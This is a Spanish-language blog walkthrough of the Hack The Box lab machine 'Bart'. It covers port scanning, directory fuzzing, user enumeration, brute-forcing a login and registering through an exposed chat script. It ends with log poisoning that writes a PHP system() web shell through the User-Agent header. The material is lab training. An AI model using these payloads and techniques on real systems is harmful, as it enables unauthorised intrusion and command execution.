<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            Hack The Box Bart - K4miyo      Ciberseguridad!      </title>
<meta name="description" content="Resolución de la máquina Bart en la plataforma de Hack The Box">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
<meta property="og:title" content="Hack The Box Bart">
<meta property="og:url" content="http://localhost:4000/htb-bart/">


  <meta property="og:description" content="Resolución de la máquina Bart en la plataforma de Hack The Box">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-bart/bart.jpg">





  <meta property="article:published_time" content="2021-10-05T00:00:00-05:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-bart/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "K4miyo",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Artículos</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categorías</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Etiquetas</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscador</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >Contacto</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Hack The Box Bart</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">K4miyo</h3>
    
    
      <p class="author__bio" itemprop="description">
        Cyber Threat Inteligence Analyst
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box Bart">
    <meta itemprop="description" content="Resolución de la máquina Bart en la plataforma de Hack The Box">
    <meta itemprop="datePublished" content="October 05, 2021">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Bart
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-10-05T00:00:00-05:00">October 05, 2021 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/htb-bart/banner-bart.jpg" alt="" /></p>

<h2 id="bart">Bart</h2>
<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.81.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.81
PING 10.10.10.81 <span class="o">(</span>10.10.10.81<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.10.81: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>654 ms

<span class="nt">---</span> 10.10.10.81 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 654.179/654.179/654.179/0.000 ms
</code></pre></div></div>

<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.81 <span class="nt">-oG</span> allPorts
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-27 22:00 CDT
Initiating SYN Stealth Scan at 22:00
Scanning 10.10.10.81 <span class="o">[</span>65535 ports]
Discovered open port 80/tcp on 10.10.10.81
Completed SYN Stealth Scan at 22:00, 28.50s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.10.81
Host is up, received user-set <span class="o">(</span>0.32s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2021-09-27 22:00:17 CDT <span class="k">for </span>28s
Not shown: 65534 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>28.69 seconds
           Raw packets sent: 131088 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 18 <span class="o">(</span>792B<span class="o">)</span>
</code></pre></div></div>

<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
───────┬───────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────
   1   │ 
   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
   3   │ 
   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.81
   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 80
   6   │ 
   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
</code></pre></div></div>

<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p80</span> 10.10.10.81 <span class="nt">-oN</span> targeted
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-27 22:01 CDT
Nmap scan report <span class="k">for </span>10.10.10.81
Host is up <span class="o">(</span>0.40s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Did not follow redirect to http://forum.bart.htb/
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>15.12 seconds
</code></pre></div></div>

<p>Como podemos ver en los resultados obtenidos, se está aplicando <em>Virtual hosting</em> y vemos la dirección hacia el dominio <code class="language-plaintext highlighter-rouge">http://forum.bart.htb/</code>, por lo que lo agregamos a nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>, tanto <code class="language-plaintext highlighter-rouge">forum.bart.htb</code> como <code class="language-plaintext highlighter-rouge">bart.htb</code>. Una vez realizado esto, hacemos uso de nuestra herramienta de confianza <code class="language-plaintext highlighter-rouge">whatweb</code> para ver que tecnologías presenta el sitio web; además de que lo visualizamos desde nuestro navegador.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://forum.bart.htb/
http://forum.bart.htb/ <span class="o">[</span>200 OK] Bootstrap, Country[RESERVED][ZZ], Email[d.simmons@bart.htb,h.potter@bart.htb,info@bart.htb,r.hilton@bart.htb,s.brown@bart.loca,s.brown@bart.local], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.81], JQuery, MetaGenerator[WordPress 4.8.2], Microsoft-IIS[10.0], PoweredBy[WordPress], Script[text/javascript], Title[BART], WordPress[4.8.2]
</code></pre></div></div>

<p><img src="/assets/images/htb-bart/bart-web.png" alt="" /></p>

<p>Hay varias cosas interesantes a tener en cuenta. Primero, tenemos unos correos electrónicos que posiblemente nos sirvan posteriormente (es importante guardar dicha info en un archivo). Además, si le echamos un ojo al sitio web, vemos que dicho correos se encuentran relacionados con los usuarios de la sección <em>OUT TEAM</em>; por lo que seria bueno relacioanar el usuario con su dirección de correo.</p>

<p><img src="/assets/images/htb-bart/bart-team.png" alt="" /></p>

<p>Al hacer la relación, tenemos algo curioso, nos sobra el correo <code class="language-plaintext highlighter-rouge">h.potter@bart.htb</code> y <code class="language-plaintext highlighter-rouge">whatweb</code> debido obtener dicho dato desde el código del sitio web; por lo que vamos a filtrar el código por el correo y notamos que las lineas asociadas a dicho usuario están comentadas.</p>

<p><img src="/assets/images/htb-bart/bart-potter.png" alt="" /></p>

<p>Tambien podríamos aplicar filtrado mediante expresiones regulares con la herramienta <code class="language-plaintext highlighter-rouge">curl</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> http://forum.bart.htb/ | <span class="nb">grep</span> <span class="nt">-A</span> 1 <span class="s2">"team-info"</span> | <span class="nb">grep</span> <span class="s2">"name"</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\&gt;.*?\&lt;'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'&gt;&lt;'</span>
Samantha Brown
Daniel Simmons
Robert Hilton
Harvey Potter
</code></pre></div></div>

<p>Ahora vemos el uso de <em>Microsoft IIS 10.0</em> y de <em>WordPress 4.8.2</em>, lo cual es un poco extraño; sin embargo, si ponemos atención, <em>WordPress</em> se encuentran catalogado como <em>MetaGenerator</em>, además si intentamos ingresar al panel de administración de la tecnología, recibimos un código de estado 500 por parte del servidor.</p>

<p>Como no vemos algo adicional, procedemos a utilzar nuestra herrmienta <code class="language-plaintext highlighter-rouge">wfuzz</code> para descubrir posibles recursos dentro del sitio web:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>2412 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://forum.bart.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work co
rrectly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://forum.bart.htb/FUZZ                                                                                               
Total requests: 220560                                                                                                           
                                                                                                                                 
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                          
=====================================================================                                                    
                                                                                                                                 
000000018:   500        0 L      12 W       75 Ch       "2006"                                                           
000000026:   500        0 L      12 W       75 Ch       "about"                                                          
000000042:   500        0 L      12 W       75 Ch       "products"                                                       
000000048:   500        0 L      12 W       75 Ch       "01"                                                             
000000050:   500        0 L      12 W       75 Ch       "06"                                                             
000000049:   500        0 L      12 W       75 Ch       "08"                                                             
000000051:   500        0 L      12 W       75 Ch       "2"                                                              
000000047:   500        0 L      12 W       75 Ch       "links"                                                         
000000046:   500        0 L      12 W       75 Ch       "09"                                                             
000000038:   500        0 L      12 W       75 Ch       "home"                                                          
000000043:   500        0 L      12 W       75 Ch       "sitemap"                                                       
000000036:   500        0 L      12 W       75 Ch       "faq"
</span></code></pre></div></div>

<p>Vemos que nos sale un código de estado 500, por lo que tambien podriamos tratar de ocultar. Adelantando un poco, no vamos a encontrar nada en dicho dominio; sin embargo, hay que recordar que tenemos el dominio <code class="language-plaintext highlighter-rouge">bart.htb</code>, por lo tanto vamos a tratar de hacer <em>fuzzing</em> con este dominio:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>0 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://bart.htb/FUZZ         
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work co
rrectly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.                                        
********************************************************                                                                         
* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                         
********************************************************                                                                         
                                                                                                                                 
Target: http://bart.htb/FUZZ                                                                                                     
Total requests: 220560                                                                                                           
                                                                                                                                 
=====================================================================                                                   
ID           Response   Lines    Word       Chars       Payload                                                          
=====================================================================                                                    
                                                                                                                                 
000000015:   200        630 L    5628 W     150693 Ch   "index"                                                          
000000018:   200        630 L    5628 W     150693 Ch   "2006"                                                           
000000017:   200        630 L    5628 W     150693 Ch   "download"                                                       
000000016:   200        630 L    5628 W     150693 Ch   "images"                                                        
000000036:   200        630 L    5628 W     150693 Ch   "faq"                                                            
000000037:   200        630 L    5628 W     150693 Ch   "rss"                                                           
000000035:   200        630 L    5628 W     150693 Ch   "cgi-bin"                                                        
000000032:   200        630 L    5628 W     150693 Ch   "blog"                                                           
000000019:   200        630 L    5628 W     150693 Ch   "news"                                                           
000000021:   200        630 L    5628 W     150693 Ch   "serial"                                                         
000000025:   200        630 L    5628 W     150693 Ch   "contact"                                                       
000000033:   200        630 L    5628 W     150693 Ch   "new"                                                            
000000034:   200        630 L    5628 W     150693 Ch   "10"                                                             
000000030:   200        630 L    5628 W     150693 Ch   "11"                                                             
000000029:   200        630 L    5628 W     150693 Ch   "privacy"                                                       
000000039:   200        630 L    5628 W     150693 Ch   "img"                                                           
000000038:   200        630 L    5628 W     150693 Ch   "home"                                                           
000000031:   200        630 L    5628 W     150693 Ch   "logo"                                                           
000000028:   200        630 L    5628 W     150693 Ch   "spacer"                                                         
000000027:   200        630 L    5628 W     150693 Ch   "search"                                                         
000000024:   200        630 L    5628 W     150693 Ch   "12"                                                            
000000026:   200        630 L    5628 W     150693 Ch   "about"                                                         
000000020:   200        630 L    5628 W     150693 Ch   "crack"                                                          
000000022:   200        630 L    5628 W     150693 Ch   "warez"                                                          
000000040:   200        630 L    5628 W     150693 Ch   "default"                                                        
000000042:   200        630 L    5628 W     150693 Ch   "products"                                                      
000000046:   200        630 L    5628 W     150693 Ch   "09"                                                             
000000023:   200        630 L    5628 W     150693 Ch   "full"                                                           
000000060:   200        630 L    5628 W     150693 Ch   "03"                                                             
000000058:   200        630 L    5628 W     150693 Ch   "article"                                                       
000000055:   200        630 L    5628 W     150693 Ch   "support"                                                       
000000051:   200        630 L    5628 W     150693 Ch   "2"                                                              
000000048:   200        630 L    5628 W     150693 Ch   "01"                                                             
000000049:   200        630 L    5628 W     150693 Ch   "08"                                                             
000000050:   200        630 L    5628 W     150693 Ch   "06"
000000051:   200        630 L    5628 W     150693 Ch   "2"                                                             
000000048:   200        630 L    5628 W     150693 Ch   "01"                                                            
000000049:   200        630 L    5628 W     150693 Ch   "08"                                                            
000000050:   200        630 L    5628 W     150693 Ch   "06"                                                            
000000045:   200        630 L    5628 W     150693 Ch   "1"                                                             
000000047:   200        630 L    5628 W     150693 Ch   "links"                                                         
000000044:   200        630 L    5628 W     150693 Ch   "archives"                                                      
000000041:   200        630 L    5628 W     150693 Ch   "2005"                                                          
000000043:   200        630 L    5628 W     150693 Ch   "sitemap"                                                       
000000053:   200        630 L    5628 W     150693 Ch   "login"                                                         
000000067:   301        1 L      10 W       145 Ch      "forum"                                                         
000000057:   200        630 L    5628 W     150693 Ch   "keygen"                                                        
000000056:   200        630 L    5628 W     150693 Ch   "05"                                                            
000000054:   200        630 L    5628 W     150693 Ch   "articles"                                                      
000000059:   200        630 L    5628 W     150693 Ch   "04"                                                            
000000052:   200        630 L    5628 W     150693 Ch   "07"                                                            
000000061:   200        630 L    5628 W     150693 Ch   "help"                                                          
000000063:   200        630 L    5628 W     150693 Ch   "archive"                                                       
000000075:   200        630 L    5628 W     150693 Ch   "content"                                                       
000000078:   200        630 L    5628 W     150693 Ch   "15"                                                            
000000077:   200        630 L    5628 W     150693 Ch   "main"                                                          
000000074:   200        630 L    5628 W     150693 Ch   "4"                                                             
000000072:   200        630 L    5628 W     150693 Ch   "13"                                                            
000000071:   200        630 L    5628 W     150693 Ch   "security"                                                      
000000073:   200        630 L    5628 W     150693 Ch   "category"                                                      
000000076:   200        630 L    5628 W     150693 Ch   "14"                                                            
000000079:   200        630 L    5628 W     150693 Ch   "press"                                                         
000000070:   200        630 L    5628 W     150693 Ch   "3"                                                             
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 73
Filtered Requests: 14
Requests/sec.: 0
</span></code></pre></div></div>

<p>Como podemos observar, vemos que para cualquier recurso se tiene un código de estado 200 y lo podemos valir vía web:</p>

<p><img src="/assets/images/htb-bart/bart-loquesea.png" alt="" /></p>

<p>Para nuestro caso, tenemos que en la línea <em>000000067</em> tenemos un código de estado 301, por lo que podemos tratar de buscar dicho código:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--sc</span><span class="o">=</span>301 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://bart.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bart.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000067:   301        1 L      10 W       145 Ch      "forum"                                                         
000001614:   301        1 L      10 W       147 Ch      "monitor"                                                       
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 1636
Filtered Requests: 1634
Requests/sec.: 0
</span></code></pre></div></div>

<p>Tenemos dos recursos, <code class="language-plaintext highlighter-rouge">forum</code> y <code class="language-plaintext highlighter-rouge">monitor</code>, por lo que vamos a echarles un ojo. Para el recurso <code class="language-plaintext highlighter-rouge">forum</code> nos mandan a lo que veíamos en http://forum.bart.htb/ y en <code class="language-plaintext highlighter-rouge">monitor</code> tenemos un panel de login.</p>

<p><img src="/assets/images/htb-bart/bart-monitor.png" alt="" /></p>

<p>Hay que recordar que tenemos nombre de usuarios, por lo que podríamos probarlos para verificar si existen dentro del panel de login. En la opción <strong>Forgot password?</strong> podemos validar introduciendo el nombre de los usuarios.</p>

<p><img src="/assets/images/htb-bart/bart-login.png" alt="" /></p>

<p>Vemos que los usuarios válidos son: <strong><em>Daniel</em></strong> y <strong><em>Harvey</em></strong>. Ahora podríamos tratar de efectuar un ataque de fuerza bruta para obtener las posibles contraseñas de dichos usuarios. Primeramente vamos a creamos un diccionario a partir del sitio web mediante el uso de la utilidad <code class="language-plaintext highlighter-rouge">cewl</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cewl <span class="nt">-w</span> diccionario.txt http://forum.bart.htb/
CeWL 5.4.8 <span class="o">(</span>Inclusion<span class="o">)</span> Robin Wood <span class="o">(</span>robin@digi.ninja<span class="o">)</span> <span class="o">(</span>https://digi.ninja/<span class="o">)</span>
❯ <span class="nb">cat </span>diccionario.txt | <span class="nb">tr</span> <span class="s1">'[A-Z]'</span> <span class="s1">'[a-z]'</span> <span class="o">&gt;</span> dictionary.txt
❯ <span class="nb">cat </span>diccionario.txt | <span class="nb">tr</span> <span class="s1">'[a-z]'</span> <span class="s1">'[A-Z]'</span> <span class="o">&gt;&gt;</span> dictionary.txt
❯ <span class="nb">cat </span>diccionario.txt <span class="o">&gt;&gt;</span> dictionary.txt
❯ <span class="nb">cat </span>dictionary.txt | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nt">-i</span> <span class="s2">"</span><span class="se">\&lt;</span><span class="s2">[a-z]</span><span class="se">\{</span><span class="s2">1,4</span><span class="se">\}\&gt;</span><span class="s2">"</span> <span class="o">&gt;</span> dictionary_final.txt
</code></pre></div></div>

<p>Con los comandos anteriores nos creamos un diccionario del sitio web quitando palabras que tengas una longitud de uno a cuatro caracteres. A partir de aquí podriamos utilizar nuestra herramienta de confianza <strong><em>Burp Suite</em></strong> para conocer la contraseña de dichos usuarios. Vamos a probar primeramente para el usuario <em>Harvey</em>:</p>

<p><img src="/assets/images/htb-bart/bart-brute.png" alt="" /></p>

<p>Vemos que para dicho usuario, la contraseña es <strong>potter</strong> y cuando tratamos de ver el sitio web, tenemos un nuevo dominio <code class="language-plaintext highlighter-rouge">http://monitor.bart.htb/</code>; por lo que lo agregamos a nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para ver el contenido del sitio.</p>

<p><img src="/assets/images/htb-bart/bart-internal.png" alt="" /></p>

<p>Dentro del apartado <strong><em>Servers</em></strong> tenemos un nuevo dominio, así que vamos a agregamos de nuevo a nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> y tratamos de visualizar su contenido vía web.</p>

<p><img src="/assets/images/htb-bart/bart-internal1.png" alt="" /></p>

<p>Tenemos otro formulario de login, por lo que podríamos tratar de utilizar los usuarios que tenemos, así como posibles credenciales por defecto; sin embargo, adelanto que no nos va a funcionar. Observando la dirección url, se tiene el recurso <code class="language-plaintext highlighter-rouge">/simple_chat/login_form.php</code> y es posible que exista información sobre dicha tecnología en Internet. De las primeras opciones que tenemos buscando tal cual ese recurso, nos encontramos con lo siguiente:</p>

<p><a href="https://github.com/magkopian/php-ajax-simple-chat/blob/master/simple_chat/register.php">register.php</a></p>

<p><img src="/assets/images/htb-bart/bart-github.png" alt="" /></p>

<p>Esto nos hace pensar que el sitio que estamos analizando puede presentar un recurso llamado <code class="language-plaintext highlighter-rouge">register.php</code> en el cual nos permitiría registrarnos y posteriormente tener acceso.</p>

<p><img src="/assets/images/htb-bart/bart-register.png" alt="" /></p>

<p>Vemos que no podemos acceder al recurso; sin embargo, eso no significa que no podamos aprovecharnos para creanos un usuario válido. Para lograr lo anterior, vamos a echarle un ojo a lo que encontramos en <strong>Github</strong>, en el cual encontramos que se tramitan las variables <code class="language-plaintext highlighter-rouge">uname</code> y <code class="language-plaintext highlighter-rouge">passwd</code> a través del método POST; por lo tanto, podemos hacer uso de la herramienta <code class="language-plaintext highlighter-rouge">curl</code> para realizar la petición al servidor.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-X</span> POST http://internal-01.bart.htb/simple_chat/register.php <span class="nt">-d</span> <span class="s1">'uname=k4miyo&amp;passwd=k4miyo123!'</span>
</code></pre></div></div>

<p>Vamos a probar si tenemos acceso con las credenciales que definimos y tenemos acceso.</p>

<p><img src="/assets/images/htb-bart/bart-chat.png" alt="" /></p>

<p>Analizando el código fuente de la página, tenemos que se está corriendo una función llamada <code class="language-plaintext highlighter-rouge">saveChat()</code> en donde se tramita una solicitud hacia el recurso <code class="language-plaintext highlighter-rouge">/log/log.php?filename=log.txt&amp;username=harvey</code>.</p>

<p><img src="/assets/images/htb-bart/bart-log.png" alt="" /></p>

<p>Podriamos tratar de modificar el campo <code class="language-plaintext highlighter-rouge">username</code> para ver que nos devuelve el servidor y tenemos que para los usuarios válidos tenemos una respuesta de <strong>1</strong> y para otros vemos un <strong>0</strong>. Además, analizando el recurso, vemos que posiblemente se está tramitando algo hacia un recurso a llamado <code class="language-plaintext highlighter-rouge">log.txt</code>; por lo que vamos a echarle un ojo al recurso <code class="language-plaintext highlighter-rouge">/log/log.txt</code>:</p>

<p><img src="/assets/images/htb-bart/bart-log1.png" alt="" /></p>

<p>Vemos que cada ves que hacemos una consulta hacia http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey, se ve reflejado en el recurso http://internal-01.bart.htb/log/log.txt; además es posible que podamos crear archivos debido al parámetro <code class="language-plaintext highlighter-rouge">filename</code>:</p>

<ul>
  <li>http://internal-01.bart.htb/log/log.php?filename=k4miyo.txt&amp;username=daniel</li>
  <li>http://internal-01.bart.htb/log/k4miyo.txt</li>
</ul>

<p>Tenemos la posibilidad de crear archivos dentro del recurso, por lo que ya debemos estar pensando en un <strong><em>log poisoning</em></strong> enviando comandos a través del header:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"User-Agent: &lt;?php system('whoami') ?&gt;"</span> http://internal-01.bart.htb/log/log.php<span class="se">\?</span><span class="nv">filename</span><span class="o">=</span>k4miyo.txt<span class="se">\&amp;</span><span class="nv">username</span><span class="o">=</span>daniel
</code></pre></div></div>

<p><img src="/assets/images/htb-bart/bart-log2.png" alt="" /></p>

<p>Vemos que nuestro código no se interpreta y esto es normal debido a que estamos creando un archivo de texto (txt). Vamos a cambiar la extensión por <strong>php</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-H</span> <span class="s2">"User-Agent: &lt;?php system('whoami') ?&gt;"</span> http://internal-01.bart.htb/log/log.php<span class="se">\?</span><span class="nv">filename</span><span class="o">=</span>k4miyo.php<span class="se">\&amp;</span><span class="nv">username</span><span class="o">=</span>daniel
</code></pre></div></div>

<p><img src="/assets/images/htb-bart/bart-log3.png" alt="" /></p>

<p>Para trabajar un poco mejor, vamos a generar una variable que nos permita ejecutar comados y a través de python para evitar problemas con los caracteres especiales en bash:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3
Python 3.9.2 <span class="o">(</span>default, Feb 28 2021, 17:03:44<span class="o">)</span> 
<span class="o">[</span>GCC 10.2.1 20210110] on linux
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span> import requests
<span class="o">&gt;&gt;&gt;</span> headers <span class="o">=</span> <span class="o">{</span><span class="s1">'User-Agent'</span> : <span class="s1">'&lt;?php system($_REQUEST["cmd"]); ?&gt;'</span><span class="o">}</span>
<span class="o">&gt;&gt;&gt;</span> r <span class="o">=</span> requests.get<span class="o">(</span><span class="s1">'http://internal-01.bart.htb/log/log.php?filename=shell.php&amp;username=daniel'</span>, <span class="nv">headers</span><span class="o">=</span>headers<span class="o">)</span>
<span class="o">&gt;&gt;&gt;</span>
</code></pre></div></div>

